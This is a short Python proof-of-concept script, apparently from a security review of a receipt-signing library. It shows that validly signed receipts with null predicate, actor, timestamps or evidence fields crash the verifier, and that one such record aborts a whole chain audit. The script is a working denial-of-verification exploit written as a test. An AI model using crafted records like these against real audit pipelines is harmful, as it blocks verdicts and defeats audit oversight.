#!/usr/bin/env python3
"""PoC 5 — Null/non-dict predicate fields crash the verifier
(denial-of-receipt via poisoned record).

verify_receipt does pred.get("actor", {}) etc. with no type checks. A receipt
whose predicate / actor / timestamps / evidence is JSON null — even a
VALIDLY SIGNED one — passes signature verification and then raises an
uncaught AttributeError. One poisoned record aborts an entire verify_chain
batch: no verdict object is produced for ANY receipt. S2.10 / S2.6.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (generate_keypair, verify_receipt, verify_chain,
                         canonical, sha256_hex, sign, keyid, PREDICATE_TYPE)

sk, pk = generate_keypair()

def craft(predicate):
    stmt = {"predicateType": PREDICATE_TYPE,
            "subject": {"name": "prod:svc",
                        "digest": {"sha256": sha256_hex(canonical(predicate))}},
            "predicate": predicate}
    payload = canonical(stmt)
    stmt["signatures"] = [{"keyid": keyid(sk.public_key()),
                           "sig": sign(sk, PREDICATE_TYPE, payload)}]
    return stmt

GOOD = {
    "action_id": "a-1",
    "actor": {"type": "human", "id": "s.lutar", "is_service_account": False,
              "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"},
    "policy_decision": {"result": "ALLOW"},
    "execution": {"status": "EXECUTED"},
    "evidence": {"items": [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}],
                 "completeness": "COMPLETE", "redaction_commitments": []},
    "timestamps": {"created": "2026-08-30T00:00:00+00:00",
                   "executed": "2026-08-30T00:00:00+00:00", "ntp_synced": True},
    "prev_chain_hash": "GENESIS",
}

cases = []
cases.append(("predicate=null (validly signed)", craft(None)))
p = dict(GOOD); p["actor"] = None;      cases.append(("actor=null", craft(p)))
p = dict(GOOD); p["timestamps"] = None; cases.append(("timestamps=null", craft(p)))
p = dict(GOOD); p["evidence"] = None;   cases.append(("evidence=null", craft(p)))

crashes = 0
for name, r in cases:
    try:
        verify_receipt(r, pk)
    except Exception:
        crashes += 1

# One poisoned record kills the whole chain audit.
try:
    verify_chain([craft(GOOD), craft(None)], pk)
except Exception:
    crashes += 1

print("EXPLOIT-WORKS" if crashes > 0 else "HELD")
